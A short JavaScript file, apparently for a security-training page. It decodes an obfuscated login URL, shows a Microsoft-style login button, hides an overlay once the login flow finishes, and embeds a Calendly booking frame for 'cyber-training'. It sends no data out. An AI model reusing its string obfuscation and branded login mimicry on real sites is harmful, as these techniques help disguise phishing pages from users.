const PREFIX = "OBFS";
const SUFFIX = "END";

let obfS = 'OBFS6MHc0RHaEND';
let obfD = 'OBFSt92YuQXatg2YlRXZu4Wan9GbEND';
let obfP = 'OBFS==Qaz12aEND';

function deobfString(str) {
    let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
    let reversed = withoutPrefixSuffix.split('').reverse().join('');
    return atob(reversed);
}


function flowDone() {
    // const loginBtn = document.getElementById("login-btn");
    // loginBtn.style.display = "none";
    // const registrationForm = document.getElementById("registration-form-section");
    // registrationForm.removeAttribute("hidden");
    const lgOverlay = document.getElementById('lgOverlay-container');
    lgOverlay.style.display = 'none';
    lgOverlay.style.pointerEvents = 'auto';
    
}


document.addEventListener("DOMContentLoaded", function() {

    const loginBtn = document.getElementById("login-btn");

    loginBtn.innerHTML = `<img id="lgImg" src="images/msf.svg"></img>${deobfString(loginBtn.innerText)}`

    const targetUrl = deobfString(obfS) + '//' + deobfString(obfD) + '/' + deobfString(obfP);

    var doneAlready = localStorage.getItem('bb-done');

    if (window.parent.location.href === targetUrl || doneAlready === "true") {
        localStorage.setItem('bb-open', false);
        localStorage.setItem('bb-done', true);
        flowDone();
    } else {
        // Show the paywall modal when the login button is clicked
        loginBtn.addEventListener("click", function() {

            localStorage.setItem('bb-open', true);
        });
    }
    

});


// Builds the correct URL to pass into the Advanced Embed Code
const buildURL = () => {
    const inviteeName = "John Doe"
    const inviteeEmail = "jd@9a.is"

    var teamPage = 'etech-it';
    var eventType = "cyber-training"
    return generatedURL = 'https://calendly.com/'+teamPage+'/'+eventType+'?embed_type=Inline&name='+inviteeName+'&email='+inviteeEmail;
  };
  
  const showCalendly = () => {
    
    // Call the "Build URL" function
    const calendlyURL = buildURL();

    const calendlyFrame = document.getElementById('calendly-frame');
    calendlyFrame.src = calendlyURL;

    
  };


  showCalendly();

